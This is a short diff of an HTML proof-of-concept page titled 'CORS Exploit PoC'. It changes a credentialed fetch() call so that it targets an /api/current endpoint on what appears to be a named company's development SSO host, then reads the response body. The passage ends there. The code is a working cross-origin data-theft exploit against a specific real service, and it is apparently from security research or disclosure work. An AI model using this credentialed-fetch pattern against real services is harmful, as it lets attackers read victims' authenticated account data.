@@ -3,7 +3,7 @@
   <body>
     <h2>CORS Exploit PoC</h2>
     <script>
-      fetch("https://fw-sso.0001.fw.dev.hydra.sophos.com/", {
+      fetch("https://fw-sso.0001.fw.dev.hydra.sophos.com/api/current", {
         credentials: "include"
       })
       .then(response => response.text())
